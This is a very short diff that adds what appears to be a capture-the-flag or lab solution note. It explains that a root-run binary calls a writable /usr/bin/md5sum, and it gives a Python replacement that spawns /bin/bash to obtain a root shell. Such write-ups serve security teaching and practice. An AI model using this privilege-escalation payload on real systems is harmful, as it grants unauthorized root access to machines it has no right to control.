@@ -1,0 +1,7 @@
+There is no vulnerability in the binary itself (except that it runs as root of course).
+/usr/bin/md5sum is writable, so write something like
+#!/bin/python3
+import os
+os.system("/bin/bash")
+
+And we're done.
